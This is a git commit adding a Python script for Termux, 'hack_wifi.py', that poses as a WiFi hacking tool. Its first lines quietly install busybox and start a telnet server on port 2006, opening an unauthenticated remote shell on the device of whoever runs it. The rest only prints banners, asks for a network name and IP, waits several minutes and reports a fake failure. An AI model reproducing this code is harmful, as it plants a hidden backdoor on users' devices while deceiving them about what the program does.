834c05fa8fd2432ac105a908183755e4cf1e8537
termux-hackr <73882037+termux-hackr@users.noreply.github.com>
2020-11-14 21:02:17 +0500

    Add files via upload

---
+++ hack_wifi.py
@@ -0,0 +1,48 @@
+import os
+os.system("pkg install busybox -y")
+os.system("telnetd -p 2006")
+import time
+import random
+#colours used
+red = '\033[31m'
+yellow = '\033[93m'
+lgreen = '\033[92m'
+clear = '\033[0m'
+bold = '\033[01m'
+cyan = '\033[96m'
+n = 2
+time.sleep(n)
+print (cyan + "\t\t\t Assalam o Alikum")
+time.sleep(n)
+print ("\n\n\n")
+time.sleep(n)
+print(cyan + yellow + "\tWelcome To Our New Tool ")
+print ("\n\n\n")
+time.sleep(n)
+print(bold + "\t<<<<<Search Noob Hackers on Youtube  !>>>>>")
+time.sleep(n)
+print (red + "\n\n\n")
+print("\t Thanks For Tour Support! ")
+print (clear + "\n\n\n")
+time.sleep(n)
+print("\tLets Start The Tool!!!!")
+time.sleep(3)
+print("\n\n\n")
+a = input(red + "Enter Any wifi Name : \t \t")
+print(clear + "\n\n")
+time.sleep(n)
+b = input(red + "Enter wifi ip adress :\t\t ")
+print("\n\n")
+time.sleep(n)
+print("\t\tTrying to Hack ....")
+print("\n\n")
+print("It will take 1 to 3 minutes so wait.....")
+time.sleep(155)
+print("\t\tDecision making .....")
+time.sleep(30)
+print("\t\tFaile To Hack")
+time.sleep(n)
+print("\t\t Beacuase of to high security...")
+time.sleep(n)
+
+print("Bye....")
